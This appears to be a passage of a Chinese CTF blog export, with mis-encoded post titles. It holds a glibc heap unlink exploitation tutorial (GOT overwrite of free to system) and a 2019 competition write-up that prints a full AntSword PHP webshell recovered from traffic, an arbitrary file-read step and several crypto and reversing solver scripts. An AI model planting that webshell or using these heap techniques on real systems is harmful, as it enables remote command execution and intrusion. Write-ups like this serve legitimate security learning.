0xf3 0x5b 0x0d 0xa1 0x6b 0xeb 0xbe 0x6e0xffffd00c: 0x55 0x87 0x8f 0xbf 0xfc 0xb3 0x91 0xe90xffffd014: 0x77 0x66 0x19 0xd7 0x24 0x20 0x51 0xcc0xffffd01c: 0x52 0x7d 0x82 0xd8 0x38 0x60 0xfb 0x1c0xffffd024: 0xd9 0xe3 0x41 0x5f 0xd0 0xcf 0x1b 0xbd0xffffd02c: 0x0f 0xcd 0x90 0x9b 0xa9 0x13 0x01 0x730xffffd034: 0x5d 0x68 0xc1 0xaa 0xfe 0x08 0x3e 0x3f0xffffd03c: 0xc5 0x8b 0x00 0xd3 0xfd 0xb6 0x43 0xbb0xffffd044: 0xd4 0x80 0xe2 0x0c 0x33 0x74 0xa8 0x2b0xffffd04c: 0x54 0x4d 0x2d 0xa4 0xdc 0x6c 0x3b 0x210xffffd054: 0x2e 0xab 0x32 0x5c 0x7b 0xe0 0x9d 0x6a0xffffd05c: 0x39 0x14 0x3c 0xb8 0x0a 0x53 0xf7 0xdd0xffffd064: 0xf4 0x2c 0x98 0xba 0x05 0xe1 0x0e 0xa3 最后的解密脚本 12345678910111213141516171819202122232425262728293031323334353637383940correct='95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a'box=[\\0xd6,0xc9,0xc2,0xce,0x47,0xde,0xda,0x70,\\0x85,0xb4,0xd2,0x9e,0x4b,0x62,0x1e,0xc3,\\0x7f,0x37,0x7c,0xc8,0x4f,0xec,0xf2,0x45,\\0x18,0x61,0x17,0x1a,0x29,0x11,0xc7,0x75,\\0x02,0x48,0x26,0x93,0x83,0x8a,0x42,0x79,\\0x81,0x10,0x50,0x44,0xc4,0x6d,0x84,0xa0,\\0xb1,0x72,0x96,0x76,0xad,0x23,0xb0,0x2f,\\0xb2,0xa7,0x35,0x57,0x5e,0x92,0x07,0xc0,\\0xbc,0x36,0x99,0xaf,0xae,0xdb,0xef,0x15,\\0xe7,0x8e,0x63,0x06,0x9c,0x56,0x9a,0x31,\\0xe6,0x64,0xb5,0x58,0x95,0x49,0x04,0xee,\\0xdf,0x7e,0x0b,0x8c,0xff,0xf9,0xed,0x7a,\\0x65,0x5a,0x1f,0x4e,0xf6,0xf8,0x86,0x30,\\0xf0,0x4c,0xb7,0xca,0xe5,0x89,0x2a,0x1d,\\0xe4,0x16,0xf5,0x3a,0x27,0x28,0x8d,0x40,\\0x09,0x03,0x6f,0x94,0xa5,0x4a,0x46,0x67,\\0x78,0xb9,0xa6,0x59,0xea,0x22,0xf1,0xa2,\\0x71,0x12,0xcb,0x88,0xd1,0xe8,0xac,0xc6,\\0xd5,0x34,0xfa,0x69,0x97,0x9f,0x25,0x3d,\\0xf3,0x5b,0x0d,0xa1,0x6b,0xeb,0xbe,0x6e,\\0x55,0x87,0x8f,0xbf,0xfc,0xb3,0x91,0xe9,\\0x77,0x66,0x19,0xd7,0x24,0x20,0x51,0xcc,\\0x52,0x7d,0x82,0xd8,0x38,0x60,0xfb,0x1c,\\0xd9,0xe3,0x41,0x5f,0xd0,0xcf,0x1b,0xbd,\\0x0f,0xcd,0x90,0x9b,0xa9,0x13,0x01,0x73,\\0x5d,0x68,0xc1,0xaa,0xfe,0x08,0x3e,0x3f,\\0xc5,0x8b,0x00,0xd3,0xfd,0xb6,0x43,0xbb,\\0xd4,0x80,0xe2,0x0c,0x33,0x74,0xa8,0x2b,\\0x54,0x4d,0x2d,0xa4,0xdc,0x6c,0x3b,0x21,\\0x2e,0xab,0x32,0x5c,0x7b,0xe0,0x9d,0x6a,\\0x39,0x14,0x3c,0xb8,0x0a,0x53,0xf7,0xdd,\\0xf4,0x2c,0x98,0xba,0x05,0xe1,0x0e,0xa3\\]flag=''for i in range(len(correct)//2): idx=box.index(int(correct[2*i:2*i+2],16)) flag+=chr(idx)print flag 参考资料【1】GDB 自动化操作的技术 【2】用 Python 拓展 GDB（一） 【3】GDB 自动化调试 【4】GDB User Manual","categories":[],"tags":[]},{"title":"详解UnLink","slug":"╧Ω╜ΓUnLink","date":"2019-11-23T09:01:25.000Z","updated":"2019-11-24T01:01:38.000Z","comments":true,"path":"2019/11/23/╧Ω╜ΓUnLink/","link":"","permalink":"http://yoursite.com/2019/11/23/╧Ω╜ΓUnLink/","excerpt":"","text":"解析首先我们先说一下为什么会合并 chunk，这是为了避免 heap 中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求。合并的主要顺序为 先考虑物理低地址空闲块 后考虑物理高地址空闲块 且 只有不是 fast bin 的情况下才会触发 unlink ，本人感觉CTF Wiki上很多东西讲的不是很清楚，故自己写了 首先又是这张经典的图 这张图，至少那时候我看得很迷糊，主要是unlink的时候到底那个是P，哪个是BK，哪个是FD，物理内存上到底又是什么样子的，就很迷糊，所以我觉得好好研究研究 又是这经典的图作为例子，还是很迷糊，于是我决定换个形式描述这张图，首先是一个chunk在内存中的真实布局 Low Address Prev_size Size fd bk High Address Content 所以上面那张图在内存中的布局应该是 Low Address Prev_size Q Size=0x81 User Content Prev_Size NextChunk Size=0x80 fd bk Unuser Data Prev_size NextChunk of NextChunk Size=0x80 High Address User Content 其中 Q 处于使用状态、Nextchunk 处于释放状态 , 当我们 free(Q) glibc 判断这个块是 small chunk 先考虑物理低地址空闲块，判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并 后考虑物理高地址空闲块，判断后向合并，发现后一个 chunk 处于空闲状态，需要合并 继而对 Nextchunk 采取 unlink 操作 则此时，P即为Nextchunk，FD是Q，BF是Nextchunk of Nextchunk 此时横向内存布局也是Low Address ——&gt; High Address Q（FD） Nextchunk（P） Nextchunk of Nextchunk（BK） Low Address High Address 那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下 FD=P-&gt;fd = Nextchunk address - 12 FD = Q BK=P-&gt;bk BK = Nextchunk of Nextchunk FD-&gt;bk = BK Q-&gt;bk = Nextchunk of Nextchunk BK-&gt;fd = FD Nextchunk of Nextchunk-&gt;fd = Q 注意到倘若我们能修改Nextchunk的fd和bk，将fd和bk指向虚构的chunk地址，那么就有可能实现任意地址读写，那么假设我们把Nextchunk的fd设定为target addr -12 **,bk设定为expect value**，那么接下来 FD=P-&gt;fd = target addr -12 BK=P-&gt;bk = expect value FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12 我们就可以使target addr = expect value, 看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限 比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。例如我们将free修改为system，当程序执行free的时候就会执行system 需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过 我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查 123// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ 如果按照我们之前说所的那样修改fd和bk此时 FD-&gt;bk = target addr - 12 + 12=target_addr BK-&gt;fd = expect value + 8 = target addr-12 就无法通过检查 首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要 fakeFD -&gt; bk == P &lt;=&gt; *(fakeFD + 12) == P fakeBK -&gt; fd == P &lt;=&gt; *(fakeBK + 8) == P 当满足上述两式时，可以进入 Unlink 的环节，进行如下操作： fakeFD -&gt; bk = fakeBK &lt;=&gt; *(fakeFD + 12) = fakeBK fakeBK -&gt; fd = fakeFD &lt;=&gt; *(fakeBK + 8) = fakeFD 如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么： *P = P - 8 *P = P - 12 即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。 需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。 123// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (&quot;corrupted size vs. prev_size&quot;); \\ 此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果 利用思路条件 UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针 已知位置存在一个指针指向可进行 UAF 的 chunk 效果使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18 思路设指向可 UAF chunk 的指针的地址为 ptr 修改 fd 为 ptr - 0x18 修改 bk 为 ptr - 0x10 触发 unlink ptr 处的指针会变为 ptr - 0x18","categories":[],"tags":[]},{"title":"2019高校运维赛WriteUp","slug":"2019╕▀╨ú╘╦╬¼╚ⁿWriteUp","date":"2019-11-21T15:16:37.000Z","updated":"2019-11-22T07:16:54.000Z","comments":true,"path":"2019/11/21/2019╕▀╨ú╘╦╬¼╚ⁿWriteUp/","link":"","permalink":"http://yoursite.com/2019/11/21/2019╕▀╨ú╘╦╬¼╚ⁿWriteUp/","excerpt":"","text":"MISC0x01 misc11234567891011121314f = open('724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt','rb')b = f.read()a = []max = int(0)min = int(999)for i in b: t = i if t &gt;= max: max = i if t &lt;= min: min = i a.append(hex(i))print(hex(max))print(hex(min)) 导出数据观察可以发现最小值为0x2，最大值为0xF9，根据判断可见字符在这个范围内的应该为EBCDIC编码，且是CP1146（IBM EBCDIC英国编码）可以编写解码脚本 123456import codecsimport ebcdicdef decode(): with codecs.open(\"724c6e962216407fa5fa1ad7efda2653_misc1_flag.txt\", 'rb') as input_file: print(input_file.read().decode('cp1146'))decode() 1ñBuCð\u001c\u0011Cx:¦\u0002@B©B£BvC·BðB¯BlB¾$EBCDIC: /eb´s@·dik/, /eb´see`dik/, /eb´k@·dik/, n. [abbreviation, Extended Binary Coded Decimal Interchange Code] An alleged character set used on IBM dinosaurs. It exists in at least six mutually incompatible versions, all featuring such delights as non-contiguous letter sequences and the absence of several ASCII punctuation characters fairly important for modern computer languages (exactly which characters are absent varies according to which version of EBCDIC you&apos;re looking at). IBM adapted EBCDIC from punched card code in the early 1960s and promulgated it as a customer-control tactic (see connector conspiracy), spurning the already established ASCII standard. Today, IBM claims to be an open-systems company, but IBM&apos;s own description of the EBCDIC variants and how to convert between them is still internally classified top-secret, burn-before-reading. Hackers blanch at the very name of EBCDIC and consider it a manifestation of purest evil.flag is flag&#123;0a07c11e46af753fd24d40023f0fdce1&#125; 最简单的方法是使用WPS Word打开文件，文件 -&gt; 文件 -&gt; 重新载入 -&gt; IBM EBCDIC英国编码 0x02 misc2111.186.57.61:10701 任意文件读取读取/proc/self/fd/3 得到flag 0x02 misc3使用010editor等十六进制编辑器打开html文件，可看见存在一段由序列E2 80 8C和序列E2 80 8B组成的隐藏字符，把E2 80 8C视为0，E2 80 8B视为1进行转换可得flag在Chrome浏览器的开发者工具中打开也可以发现 1234567890827h: E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C E2 â€Œâ€‹â€‹â€Œâ€Œâ 0837h: 80 8B E2 80 8B E2 80 8C E2 80 8C E2 80 8B E2 80 €‹â€‹â€Œâ€Œâ€‹â€ 0847h: 8B E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C ‹â€Œâ€‹â€‹â€Œâ€Œ 0857h: E2 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8C E2 â€Œâ€‹â€‹â€Œâ€Œâ 0867h: 80 8C E2 80 8C E2 80 8B E2 80 8C E2 80 8B E2 80 €Œâ€Œâ€‹â€Œâ€‹â€ 0877h: 8B E2 80 8C E2 80 8C E2 80 8B E2 80 8B E2 80 8B ‹â€Œâ€Œâ€‹â€‹â€‹ 0887h: E2 80 8C E2 80 8B E2 80 8B E2 80 8B E2 80 8B E2 â€Œâ€‹â€‹â€‹â€‹â 0897h: 80 8C E2 80 8B E2 80 8B E2 80 8C E2 80 8B E2 80 €Œâ€‹â€‹â€Œâ€‹â€ ... 123450000h: 01100110 01101100 01100001 01100111 01111011 01100101 00110010 01100001 flag&#123;e2a 0008h: 00111001 01100011 00111000 01100010 00110001 00110001 00110111 00110101 9c8b1175 0010h: 01100101 00110110 00110110 01100011 01100110 00110010 00110001 01100110 e66cf21f 0018h: 00111000 00110101 00111001 00110011 01100010 01100011 00111000 00110101 8593bc85 0020h: 01100010 01100110 00111001 00110011 00111001 01111101 bf939&#125; 0x03 webshell分析流量可知，在服务器上执行的shell解密后大致如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?php@ini_set(\"display_errors\", \"0\");@set_time_limit(0);function asenc($out)&#123; @session_start(); $key = 'f5045b05abe6ec9b1e37fafa851f5de9'; return @base64_encode(openssl_encrypt(base64_encode($out), 'AES-128-ECB', $key, OPENSSL_RAW_DATA));&#125;;;function asoutput()&#123; $output = ob_get_contents(); ob_end_clean(); echo \"8c2b4\"; echo @asenc($output); echo \"e2e10\";&#125;ob_start();try &#123; $p = base64_decode($_POST[\"0x1b4d456c7297d\"]); $s = base64_decode($_POST[\"0xb9b45688a5a08\"]); $d = dirname($_SERVER[\"SCRIPT_FILENAME\"]); $c = substr($d, 0, 1) == \"/\" ? \"-c \\\"&#123;$s&#125;\\\"\" : \"/c \\\"&#123;$s&#125;\\\"\"; $r = \"&#123;$p&#125; &#123;$c&#125;\"; function fe($f) &#123; $d = explode(\",\", @ini_get(\"disable_functions\")); if (empty($d)) &#123; $d = array(); &#125; else &#123; $d = array_map('trim', array_map('strtolower', $d)); &#125; return (function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d)); &#125; ; function runcmd($c) &#123; $ret = 0; if (fe('system')) &#123; @system($c, $ret); &#125; elseif (fe('passthru')) &#123; @passthru($c, $ret); &#125; elseif (fe('shell_exec')) &#123; print(@shell_exec($c)); &#125; elseif (fe('exec')) &#123; @exec($c, $o, $ret); print(join(\"\", $o)); &#125; elseif (fe('popen')) &#123; $fp = @popen($c, 'r'); while (!@feof($fp)) &#123; print(@fgets($fp, 2048)); &#125; @pclose($fp); &#125; elseif (fe('antsystem')) &#123; @antsystem($c); &#125; else &#123; $ret = 127; &#125; return $ret; &#125; ; $ret = @runcmd($r . \" 2&gt;&amp;1\"); print ($ret != 0) ? \"ret=&#123;$ret&#125;\" : \"\";;&#125; catch (Exception $e) &#123; echo \"ERROR://\" . $e-&gt;getMessage();&#125;;asoutput();die();?&gt;//ed3edq113 在第七个HTTP流中，读取了flag 12In [4]: base64.b64decode(&apos;Y2QgIi92YXIvd3d3L2h0bWwvdG1wIjtjYXQgZmxhZ3xiYXNlNjQgO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==&apos;)Out[4]: b&apos;cd &quot;/var/www/html/tmp&quot;;cat flag|base64 ;echo [S];pwd;echo [E]&apos; flag经过了一层base64加密，在asoutput方法中增加了前后缀，然后在套一下base64，顺便AES加密响应的内容如下： 1kRD1eD+vSZ81FAJ6XClabCR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dZOTFg4DW9MYwG6k3rEvAAR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJHygVK0ad8xG1Qk6pzSaCiR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJ1qI47Cz1/qfnNoNARGhLfVhC0RJlfeKCvbPwpjFn//BSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93FIVjxEmVnLHPVr5M/LQPdxSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93GnMvJfVbvphfWnt17IOkzYjvv91k2fnYDR7u4nlGM3YitxGYGs9mn+HS5iJBXORtYrcRmBrPZp/h0uYiQVzkbWK3EZgaz2af4dLmIkFc5G1itxGYGs9mn+HS5iJBXORtUq4dBjDRFhDqDyzs9CScJhrd3yMusQ+qsnZkq4Ey7NVJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l2hDPuDhVN4TaDLzp9bXyfGeCVhvglAaNo2rA/ovnRTTtfA5ZywMOOijj6md5RItqjXwOWcsDDjoo4+pneUSLao18DlnLAw46KOPqZ3lEi2qNfA5ZywMOOijj6md5RItqgS0b9hS7r5TX9YNZo2awgUAyqVacVgwr1NlNQ2k/kihhh0QQfnjeGdZhkz0N0jAKiMzFmAMa7xQ1URxTaHoHjDg3NaWl/8+PVG+pyaKrbNDjfl77POeQE8+0MCHpz6YxWLJ6mwCe1X3uzz/HSHcHSvQBB8FxjOhugOErOXkd3LZi/60Gr4gIEc1JIxA5A2pE/V6Z/DFwNOR4M/IIIWdGr5 解密脚本 12345&lt;?php$r=file_get_contents(\"enc\");$key = 'f5045b05abe6ec9b1e37fafa851f5de9';echo openssl_decrypt(base64_decode($r), 'AES-128-ECB', $key, OPENSSL_RAW_DATA);?&gt; 拿到flag:flag{AntSword_is_Powerful_3222222!!!!} rere1init_array和fini_array都有一个函数，在init_array里的函数里加了反调，直接patch即可，然后还把key修改了 12345for ( j = 0; j &lt;= 15; ++j ) &#123; result = aThisIsNotKey; aThisIsNotKey[j] ^= 7u; &#125; 然后fini_array才是最后的比较函数 123456for ( i = 0; i &lt;= 15; ++i ) &#123; result = (unsigned __int8)byte_202040[i + 0x10]; if ( byte_2020E0[i] != (_BYTE)result ) v2 = 0; &#125; 加密函数是RC4算法，解题脚本为： 123456789import base64from Crypto.Cipher import ARC4key = \"sontXntXihsXlb~&amp;\"data = \"A\"*0x10rc41 = ARC4.new(key)# part1 = rc41.decrypt('78695a5c2515935f6d150711ee01b3ab'.decode('hex'))part2 = rc41.decrypt('7f305e5f1619bf7471131025d75fe1ff'.decode('hex'))print part2 re232元一次方程组,把数据扣出来在到在线网站上解密（ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127# import re# a = ''' 17153 * a1[27]# + 41549 * a1[26]# + 28202 * a1[24]# + 36806 * a1[23]# + 12690 * a1[22]# + 42821 * a1[20]# + 39834 * a1[19]# + 17994 * a1[17]# + 32765 * a1[14]# + 25687 * a1[10]# + 33388 * a1[9]# + 143 * a1[4]# + 63776 * a1[0]# + 8682 * a1[1]# - 16324 * a1[2]# - 20022 * a1[3]# - 48973 * a1[5]# - 57775 * a1[6]# - 43820 * a1[7]# - 41070 * a1[8]# - 15669 * a1[11]# - 6946 * a1[12]# - 23187 * a1[13]# - 46495 * a1[15]# - 8395 * a1[16]# - 27782 * a1[18]# - 46043 * a1[21]# - 15428 * a1[25]# - 59010 * a1[28]# - 49235 * a1[29]# - 53666 * a1[30]# + 28539 * a1[31] == -15479857 '''# a = a.replace(\"a1\",\"\").split(\"\\n\")# matrix = [0 for i in range(32)]# for i in range(32): # f = re.search(\"([+-]?) ([0-9]*)\",a[i]).groups()[0] # value = int(re.search(\"([+-]?) ([0-9]*)\",a[i]).groups()[1]) # if f != '': # if f == '-': # value = -1*value # else: # pass # idx = int(a[i][a[i].find('[')+1:a[i].find(']')]) # matrix[idx] = value# m = ''# for i in matrix: # m += str(i)+','# m = m.strip(',')# print m# http://www.yunsuan.info/matrixcomputations/solvelinearsystems.html# 44493,-326,-57451,-18424,22432,45266,20069,47551,-3751,39591,35081,45204,-6984,-9410,-54261,2139,48734,-62111,44970,29470,-20305,-33120,39390,1513,58180,-11160,-24198,37157,50244,-1646,37027,-13318# -54741,-3606,48560,-45416,22008,11900,-24275,-64371,32499,46114,-25714,21730,-56673,9624,28702,-39430,9187,-35779,26720,-15144,51548,11260,48594,-45050,-59016,50109,-29262,-55650,-29492,-13828,12535,40522# 17703,-16114,-24359,54532,15266,5819,-33999,19362,-58904,63538,64858,2665,-11844,-29623,20144,43681,32755,-42532,-60912,20331,3541,53780,29817,-4711,-56853,57822,31675,52683,57988,-33486,12097,24590# 24247,64898,-24733,3430,41149,17219,-16545,42702,-1315,24960,27013,28,2783,-15867,-12126,28232,-3823,37522,48151,-20727,-12037,-9347,-39338,-50524,-38675,-26114,-4975,59561,32393,36741,51792,-24297# -32261,-54551,15294,-61664,-40648,-12277,-55300,-63212,41251,-45548,-22362,-32993,64221,-43046,-40770,5380,57738,62825,52035,3079,-7119,26782,-36194,-56102,-19468,54655,35562,-59856,25143,13289,64702,23822# -9407,64048,60965,33702,-12654,-56126,-47366,47843,30627,-29056,32583,-50822,-6240,43847,47577,-12371,8314,22558,9886,43924,-23282,-13137,-13716,6461,63681,-43391,-37217,-43714,-55909,-62806,5977,36688# -23136,47281,20301,-61441,2565,57144,44459,-31365,16024,54218,-56894,-52977,-39404,-63477,63390,-22773,46343,-50258,40389,-25970,23917,-56685,47030,5856,-55893,36904,44955,58093,13407,49426,26401,-25199# 62577,23069,18654,4696,22400,-16178,42663,-34941,-50803,-28229,15341,3911,-45565,50053,-45774,18373,7881,-28140,1742,-29986,58351,14952,-40067,15201,11269,53436,41681,22198,-63863,-50393,-14615,16722# -39728,57392,910,37963,-2274,-61995,-43938,-12412,-10642,-10303,31888,7362,-16356,-615,40135,-11314,-17185,54431,-61134,-4620,-4591,29560,35119,-51958,40581,34037,-65066,5750,-6232,-60002,17326,30503# -16296,-8786,48180,-65236,-48383,-32713,61315,-58771,-47593,-14512,6483,56260,25366,58190,-60203,27537,50686,-7295,-3885,61335,-39212,-40687,-19258,-57463,32582,2313,-24504,-11629,-8917,31106,-4535,38212# -31610,52623,-35005,25689,-9320,63683,39253,51102,-16508,11413,3265,35320,18706,6847,-55110,528,35247,-63180,30153,-13666,39538,-49046,33264,51928,13203,17103,59096,48721,33683,-42949,-60950,26096# 47557,52902,-12806,-59773,-9182,-57417,-18447,6146,15859,59808,30791,-54963,45466,-61599,49637,21116,15786,3656,-18454,28722,46709,21307,50390,5176,-30277,-25544,-17882,-25149,61328,-17363,49588,21848# 37688,23309,-2616,59129,5104,-12561,-3215,60503,29438,42505,-49703,38339,12457,45365,-15471,33925,-23447,-50859,-86,54770,36604,-3773,-9573,-25835,42417,4680,-20107,58284,-45915,-56171,18191,29164# 20452,18062,-56424,56918,-10457,50206,-12288,-54591,-44777,24700,12962,38458,-52078,19385,18867,-9805,-48011,-27363,-20890,13714,-788,50998,29867,-7954,-34056,16127,5149,49705,-34732,-54092,64657,35416# -39611,25246,1951,-37145,-3824,21330,-49145,-43603,8191,-60671,-53032,-48392,-15417,40645,-13059,-58653,42329,-51631,-50173,18903,52431,-44904,37330,40656,-34380,24333,41644,-18100,-57765,-64534,44968,-26760# -39824,44401,45166,53538,-2540,43929,-54452,-11199,-19801,23926,-13592,47959,19579,-29922,30392,15405,61374,17545,39526,7046,-34144,57593,-5305,-46917,44211,-4511,-23881,29438,-39081,34688,28579,3296# 62215,19566,15203,-30340,-15964,59815,-13939,60087,-43008,-44925,-49239,-40498,-54453,-33557,6928,24510,36587,-24721,7959,49381,-21456,-40311,8487,-61111,-18918,-33393,-9301,41415,-61619,64380,40454,58498# 35423,-12994,33894,40977,57560,63291,-32256,-23534,40291,5725,-40660,43131,-19119,21483,39085,62097,-33732,-63756,35027,3633,30380,36333,-13528,53612,6578,-47605,10809,-43202,14305,2766,-42819,-34232# 44942,63420,58838,55103,27162,53130,27559,26302,-24313,-42499,-21629,34155,-2633,-55014,-22926,19761,-305,-63708,13647,31419,62674,-32334,-47684,-54226,-50848,10136,26215,44427,27903,48054,-15102,-22362# 6300,-30549,9153,26426,46559,-55683,62261,-44433,6137,-46194,-57198,33875,-45266,51231,65438,45781,-6605,-43397,-7672,-48485,-54035,-12567,-47051,-62256,13058,55552,4221,61587,23936,-9828,59525,50225# -28415,36297,5686,59059,14796,-11307,-57251,-29507,-41415,12090,62270,8353,-24476,-41751,-46589,63967,55058,10481,30422,47722,-55870,-6321,53136,12704,42884,-34350,-32922,-64909,-50870,13236,39286,49349# 15479,10453,58731,-9782,63976,-9166,5707,-21516,-2689,29174,23244,-47968,-38843,-13488,61646,3991,57764,-57649,63445,-487,6252,52361,16634,42491,-30704,54808,-61218,18612,-32873,-58677,-2280,35233# 36368,-30534,50614,-7805,9520,-60795,-17511,-34692,-22139,-49013,-24672,41197,35504,28641,11252,-22264,56629,23301,-55578,-61882,-48469,28509,-8197,-43020,15688,29396,-36911,38392,58430,-6762,38132,56670# 3542,-17533,28247,1791,-44455,-2748,21876,-38052,8511,61205,-16528,-4664,-13326,16494,-52661,-38860,58300,-60164,-39975,-19566,55072,-55251,-8160,-54674,58305,-29010,-6627,35318,-15962,19958,-10549,-8177# -7510,-61303,25124,35004,-34033,-49161,-6021,-36125,37617,-10528,-47741,-45531,-1546,2052,-59464,29853,-22656,31346,26883,38644,26034,-24655,-9816,8621,-22299,-23745,37204,47703,13827,15394,-23945,48741# 19310,1288,-38840,-49229,-40618,39102,34746,-41363,-45367,41169,-21440,-36535,33349,-43289,47866,5395,56668,-41392,30949,53570,-40337,16432,-1430,-28334,35917,-46487,61644,8511,-42458,27496,-59664,64335# -18187,28981,-53485,17974,41797,-20458,-8491,-16831,33384,53494,-31995,51835,-12109,30996,42087,60427,12986,-51691,-58925,-40872,33269,3954,56824,-30202,59304,-30793,26203,13806,-42110,41403,-1100,-26194# -40011,-26232,-4849,-60564,20386,44081,-50739,40590,-17237,19883,-35381,28950,-4203,19225,-50964,-39946,28859,12186,38175,-22511,-20539,15071,48156,34737,42732,-60250,-61430,-11009,47559,53536,-8879,46741# -42653,43668,-10988,3756,34932,61953,22126,29632,59350,-48711,-23958,-33557,50367,41961,-17831,-4583,41615,27387,34328,-29750,9871,-49888,41239,18672,20039,56136,-30956,7689,45907,5442,-41068,23514# -26968,-23313,38342,5179,10458,3678,-32333,-43275,-2423,-60827,-42621,15986,-27590,59508,53583,19553,-56307,869,6738,63177,-30359,50228,21760,-19919,24036,-18153,41909,-6931,-5822,-30949,-16572,11920# 8386,57646,35980,-4029,8314,18877,4313,29760,-47059,46356,52295,35013,57567,-25490,64744,1703,55168,-62526,37870,-63227,-27315,31098,6747,63177,55323,-23370,-37329,54696,-6309,43819,-12433,8882# 63776,8682,-16324,-20022,143,-48973,-57775,-43820,-41070,33388,25687,-15669,-6946,-23187,32765,-46495,-8395,17994,-27782,39834,42821,-46043,12690,36806,28202,-15428,41549,17153,-59010,-49235,-53666,28539# 34771791# -9451883# 29782736# 27959979# -10644544# 230179# 15871572# 12844672# -7906855# -5359162# 34815239# 23582278# 30273764# 7501764# -35816639# 30983928# -4472687# 18523534# 20982750# 5070455# 3066924# 26232118# -860377# -14482154# -17062269# 6695285# 16909859# -1622782# 33025495# -10454601# 51177223# -15479857res = [99,115,50,56,82,116,116,104,72,113,115,98,117,102,111,106,115,76,122,55,121,103,50,68,89,113,87,81,69,69,99,89]flag = ''.join([chr(i) for i in res])print flag cryptorsa1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from Crypto.Util.number import *import gmpy2import randomfrom gmpy2 import *n=21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301e = 65537nnn1=int(str(n)[:200])-1nnn2=int(str(n)[600:])ab=int(str(nnn1)+str(nnn2))ab=2117306430457495084373744640919209184441085835440785339151821982858580957554648046398035452941253078562547380021066127607547324391257803263684574686690799140082210093930925498879813981907487546461281266736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301a2b2=n-(pow(10,400)+1)*ab #a**2+b**2# print a2b2t=a2b2/pow(10,200)# print t t1=t+2*ab #(a+b)**2print \"(a+b)**2:\",t1 #(a+b)**2 t2=t1-4*ab #(a-b)**2print \"(a-b)**2:\",t2 #(a-b)**2 tt1=iroot(t1,2)[0]print \"(a+b):\",tt1 #(a+b)tt2=iroot(t2,2)[0] print \"(a-b):\",tt2 #(a-b)b=(tt1-tt2)/2a=tt1-bprint \"b:\",bprint \"a:\",aprint iroot(t1,2)print iroot(t2,2)p = a*pow(10,200)+bq = b*pow(10,200)+aprint p*q==nprint \"p\",pprint \"q\",qphin = (p - 1) * (q - 1)d = gmpy2.invert(e, phin)print \"d\",dc=16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836flag = gmpy2.powmod(c, d, n)print hex(flag)[2:].decode('hex') AES查看加密函数 1234def enc(msg, key): ctr 